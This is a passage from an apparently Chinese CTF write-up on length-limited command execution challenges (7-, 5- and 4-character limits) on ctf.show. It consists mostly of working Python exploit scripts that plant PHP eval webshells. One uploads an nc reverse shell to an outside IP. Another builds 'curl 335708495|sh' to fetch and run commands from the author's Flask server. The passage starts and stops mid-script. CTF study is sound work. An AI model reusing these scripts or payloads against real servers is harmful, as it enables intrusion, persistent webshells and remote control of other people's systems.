class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;.1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="web目录不可写"><a href="#web目录不可写" class="headerlink" title="web目录不可写"></a>web目录不可写</h5><p>既然当前目录不可写，那么可以利用可写的目录，比如php的临时文件存储目录<code>/tmp/</code></p><p>这样我们可以利用php的文件存储机制强行上传一个文件，内容是反弹shell的语句，然后利用<code>. /t*/*</code>匹配我们上传的文件并执行，刚好7个字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-4.png"></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:10</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getShell</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>file = &#123;<br><span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">b&quot;#!/bin/sh\nnc 43.154.107.226 3389 -e /bin/sh&quot;</span><br>&#125;<br>requests.post(url,data=data,files=file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>getShell(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="5字符长度的命令执行"><a href="#5字符长度的命令执行" class="headerlink" title="5字符长度的命令执行"></a>5字符长度的命令执行</h4><h5 id="环境有dir"><a href="#环境有dir" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路：<br>1：将<code>index.php</code>转为<code>.php</code><br>2：将临时文件打包到当前目录<br>3：使用php执行tar压缩包</p><p>第一步的操作与7字符可写差不多，主要是为了<code>index.php</code>这个文件名不影响后面的排序</p><p>先复制一份<code>index.php</code>的内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-1.png"></p><p>然后通过<code>cp</code>，<code>rev</code>，<code>dir</code>等命令将<code>index.php</code>转化为了<code>php.xedni</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-2.png"></p><p>先将多余的文件删除，再利用shell中的注释符<code>#</code>，成功得到<code>.php</code>文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-3.png"></p><p>删去多余的文件，创建<code>tar</code>命令和<code>vcf</code>参数</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-4.png"></p><p>强制上传一个文件到php的文件缓存目录<code>/tmp/xxxx</code>，内容是<code>&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);?&gt;</code></p><p>然后最关键的命令来了，使用<code>* /t*</code>打包恶意文件到<code>z</code>，实际上执行的是<code>tar vcf z /tmp/*</code></p><p>最后使用<code>php z</code>命令写入shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-5.png"></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/&quot;</span><br>url_2 = url+<span class="hljs-string">&quot;.php&quot;</span><br>delay = <span class="hljs-number">1</span><br><br>chagneFile_payload=[<br><span class="hljs-string">&#x27;&gt;cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k&#x27;</span>,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br><span class="hljs-string">&#x27;rm cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;pc&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;rm v&#x27;</span>,<br><span class="hljs-string">&#x27;rm k&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span>,<br><span class="hljs-string">&#x27;rm pc&#x27;</span>,<br><span class="hljs-string">&#x27;rm *v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php.&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vm&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span><br>]<br><br>clearFile_payload=[<br><span class="hljs-string">&#x27;rm d*&#x27;</span>,<br><span class="hljs-string">&#x27;rm j*&#x27;</span>,<br><span class="hljs-string">&#x27;rm p*&#x27;</span>,<br><span class="hljs-string">&#x27;rm r*&#x27;</span>,<br><span class="hljs-string">&#x27;rm v*&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span><br>]<br><br>shell_payload=[<br><span class="hljs-string">&#x27;&gt;tar&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vcf&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;z&#x27;</span><br>]<br><br>file=&#123;<br><span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changeFile</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> chagneFile_payload:<br>sendPayload(url,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clearFile</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> clearFile_payload:<br>sendPayload(url_2,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> shell_payload:<br>sendPayload(url_2,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(delay)<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;* /t*&quot;</span><br>&#125;<br>requests.post(url_2,data=data,files=file)<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;php z&quot;</span><br>&#125;<br>requests.post(url_2,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkShell</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendPayload</span>(<span class="hljs-params">url,payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>changeFile()<br>clearFile()<br>getshell()<br>checkShell()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir"><a href="#环境无dir" class="headerlink" title="环境无dir"></a>环境无dir</h5><p><code>dir</code>与<code>ls</code>最大的区别就是<code>dir</code>没有换行</p><p>这题主要思路是利用<code>grep</code>命令修改题目，可以说是非常巧妙了</p><p>具体步骤如下:</p><p>写入<code>grep</code>和<code>h</code>，接着<code>*</code>执行，实际上就是拿出题目中包含<code>h</code>的每一行，恰好<code>if(strlen($cmd) &lt;= 5)</code>是没有<code>h</code>的，这样就没有限制了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-6.png"></p><p>将修改后的代码追加到<code>i</code>中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-7.png"></p><p><code>cp</code>到<code>index.php</code>中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-8.png"></p><p>整合脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:28</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;grep&quot;</span>,<br><span class="hljs-string">&quot;&gt;h&quot;</span>,<br><span class="hljs-string">&quot;*&gt;j&quot;</span>,<br><span class="hljs-string">&quot;rm g*&quot;</span>,<br><span class="hljs-string">&quot;rm h*&quot;</span>,<br><span class="hljs-string">&quot;&gt;cat&quot;</span>,<br><span class="hljs-string">&quot;*&gt;&gt;i&quot;</span>,<br><span class="hljs-string">&quot;rm c*&quot;</span>,<br><span class="hljs-string">&quot;rm j&quot;</span>,<br><span class="hljs-string">&quot;&gt;cp&quot;</span>,<br><span class="hljs-string">&quot;*&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="4字符长度的命令执行"><a href="#4字符长度的命令执行" class="headerlink" title="4字符长度的命令执行"></a>4字符长度的命令执行</h4><h5 id="环境有dir-1"><a href="#环境有dir-1" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路和7字符可写差不多，拼接出<code>ls -t</code>命令到某个文件中，在按倒序写入写马的语句，依次执行即可。主要是注意文件顺序问题</p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:42</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;sl&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;kt-&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;x&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><span class="hljs-string">&#x27;sh x&#x27;</span>,<br><span class="hljs-string">&#x27;sh j&#x27;</span><br>]<br><span class="hljs-comment">#&lt;?php eval($_GET[1]);?&gt;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir，可写"><a href="#环境无dir，可写" class="headerlink" title="环境无dir，可写"></a>环境无dir，可写</h5><p>思路是通过<code>ls</code>，<code>mv</code>，<code>cat</code>构造出<code>ls -t&gt;a</code>，再<code>curl</code>写一句话</p><p>具体操作如下：</p><p>先将<code>ls -t&gt;a</code>写入<code>z</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-1.png"></p><p>倒序写入<code>curl 335708495|sh</code>，注意服务器的ip要先转int</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-2.png"></p><p>服务器上用<code>flask</code>写个<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先执行<code>sh z</code>，即执行了<code>ls -t&gt;a</code>，即向<code>a</code>写入<code>curl 335708495|sh</code>，再<code>sh a</code>，就执行了<code>curl 335708495|sh</code>，并返回<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code>，成功写入<code>1.php</code></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:58</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span 